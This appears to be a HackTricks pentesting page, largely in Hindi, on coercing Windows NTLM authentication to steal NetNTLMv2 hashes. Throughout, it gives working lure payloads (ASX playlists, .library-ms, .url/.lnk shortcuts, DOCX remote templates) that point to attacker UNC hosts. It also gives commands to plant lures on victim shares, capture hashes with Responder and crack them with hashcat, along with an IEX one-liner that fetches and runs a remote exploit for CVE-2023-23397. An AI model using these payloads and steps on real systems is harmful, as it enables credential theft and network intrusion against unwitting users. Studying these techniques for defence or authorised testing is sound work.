# NTLM creds चुराने की जगहें

{{#include ../../banners/hacktricks-training.md}}

**[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) पर दिए गए सभी बेहतरीन विचार देखें — एक Microsoft Word फ़ाइल को ऑनलाइन डाउनलोड करने से लेकर ntlm leaks स्रोत: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods) तक।**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

यदि आप किसी share पर लिख सकते हैं जिसे उपयोगकर्ता या scheduled jobs Explorer में ब्राउज़ करते हैं, तो ऐसी फाइलें डालें जिनकी metadata आपके UNC (उदा. `\\ATTACKER\share`) की ओर इशारा करती हों। फोल्डर को रेंडर करने पर **implicit SMB authentication** ट्रिगर होती है और यह आपके listener को एक **NetNTLMv2** leak कर देता है।

1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **उन्हें writable share पर डालें** (कोई भी फ़ोल्डर जो लक्ष्य खोलता है):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **सुनें और crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows एक बार में कई फाइलों को ट्रिगर कर सकता है; Explorer previews (`BROWSE TO FOLDER`) के लिए किसी क्लिक की ज़रूरत नहीं होती।

### Windows Media Player playlists (.ASX/.WAX)

यदि आप किसी टार्गेट को अपना नियंत्रित Windows Media Player playlist खोलने या preview करने के लिए प्रेरित कर सकें, तो entry को एक UNC path की ओर इशारा करके आप Net‑NTLMv2 leak कर सकते हैं। WMP संदर्भित मीडिया को SMB के माध्यम से प्राप्त करने का प्रयास करेगा और स्वचालित रूप से authenticate करेगा।

उदाहरण payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
संग्रह और cracking flow:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer सीधे ZIP archive के अंदर से खोली जाने पर .library-ms फाइलों को असुरक्षित रूप से हैंडल करता है। अगर library definition किसी remote UNC path (उदाहरण के लिए, \\attacker\share) की ओर इशारा करता है, तो ZIP के अंदर .library-ms को केवल ब्राउज़/लॉन्च करने भर से Explorer UNC को enumerate करता है और attacker को NTLM authentication भेज देता है। इससे NetNTLMv2 प्राप्त होता है जिसे offline में क्रैक किया जा सकता है या संभावित रूप से relay किया जा सकता है।

Minimal .library-ms जो attacker UNC की ओर इशारा करता है
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
ऑपरेशनल कदम
- .library-ms फाइल ऊपर दिए गए XML के साथ बनाएं (अपना IP/hostname सेट करें)।
- इसे Zip करें (on Windows: Send to → Compressed (zipped) folder) और ZIP को लक्ष्य तक पहुँचाएँ।
- NTLM capture listener चलाएँ और प्रतीक्षा करें कि victim ZIP के अंदर से .library-ms खोले।

### Outlook कैलेंडर रिमाइंडर साउंड पाथ (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows कैलेंडर आइटम्स में extended MAPI property PidLidReminderFileParameter को प्रोसेस करता था। यदि वह property किसी UNC path (उदा., \\attacker\share\alert.wav) की ओर इशारा करती थी, तो रिमाइंडर ट्रिगर होने पर Outlook SMB share से संपर्क करता था, और user का Net‑NTLMv2 बिना किसी क्लिक के leak कर देता था। इसे 14 मार्च 2023 को patch किया गया था, लेकिन यह legacy/untouched fleets और historical incident response के लिए अभी भी अत्यंत प्रासंगिक है।

PowerShell (Outlook COM) के साथ त्वरित exploitation:
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener पक्ष:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
नोट्स
- एक पीड़ित के लिए केवल तब Outlook for Windows चल रहा होना चाहिए जब रिमाइंडर ट्रिगर हो।
- यह leak Net‑NTLMv2 देता है जो offline cracking या relay के लिए उपयुक्त है (pass‑the‑hash नहीं)।


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer शॉर्टकट आइकन स्वचालित रूप से रेंडर करता है। हालिया शोध से पता चला कि Microsoft के April 2025 पैच के बाद भी UNC‑icon शॉर्टकट्स के लिए, शॉर्टकट टारगेट को UNC path पर होस्ट करके और आइकन को लोकल रखकर बिना किसी क्लिक के NTLM authentication ट्रिगर करना संभव था (पैच बायपास को CVE‑2025‑50154 आवंटित किया गया)। केवल फ़ोल्डर को देखने भर से Explorer रिमोट टारगेट से मेटाडेटा प्राप्त करता है, और NTLM attacker SMB server को भेज देता है।

न्यूनतम Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) PowerShell के माध्यम से:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- ZIP में shortcut डालें और लक्षित उपयोगकर्ता को उसे ब्राउज़ करने के लिए प्रेरित करें।
- shortcut को उस writable share पर रखें जिसे लक्षित उपयोगकर्ता खोलने वाला है।
- उसी फ़ोल्डर में अन्य lure files के साथ Combine करें ताकि Explorer आइटम का preview दिखाए।

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows `.lnk` metadata को केवल execution पर ही नहीं बल्कि **view/preview** (icon rendering) के दौरान लोड करता है। CVE‑2026‑25185 एक parsing पाथ दिखाता है जहाँ **ExtraData** ब्लॉक्स shell को एक icon path resolve करने और लोड के दौरान filesystem को touch कराने के लिए प्रेरित करते हैं, जिससे remote path होने पर outbound NTLM निकलता है।

मुख्य ट्रिगर शर्तें (निरिक्षित `CShellLink::_LoadFromStream` में):
- ExtraData में **DARWIN_PROPS** (`0xa0000006`) शामिल करें (icon update routine का gate)।
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) शामिल करें और उसमें **TargetUnicode** populated हो।
- loader `TargetUnicode` में environment variables को expand करता है और resulting path पर `PathFileExistsW` को कॉल करता है।

यदि `TargetUnicode` किसी UNC path पर resolve होता है (उदा., `\\attacker\share\icon.ico`), तो केवल फ़ोल्डर **देखने** भर से जिसमें shortcut है outbound authentication हो जाती है। यही load path **indexing** और **AV scanning** से भी ट्रिगर हो सकता है, जिससे यह एक व्यावहारिक no‑click leak surface बन जाता है।

Research tooling (parser/generator/UI) **LnkMeMaybe** project में उपलब्ध है ताकि आप बिना Windows GUI का उपयोग किए इन संरचनाओं का निर्माण/निरीक्षण कर सकें।


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office दस्तावेज़ एक external template reference कर सकते हैं। अगर आप attached template को एक UNC path पर सेट करते हैं, तो दस्तावेज़ खोलने पर SMB के लिए authentication होगा।

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) word/_rels/settings.xml.rels को संपादित करें और rId1337 को अपने UNC पर निर्देशित करें:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) .docx में पुनः पैक करें और वितरित करें। अपने SMB capture listener को चलाएँ और open होने तक प्रतीक्षा करें।

Post-capture के बाद NTLM को relay या abuse करने के विचारों के लिए, देखें:

{{#ref}}
README.md
{{#endref}}


## संदर्भ
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
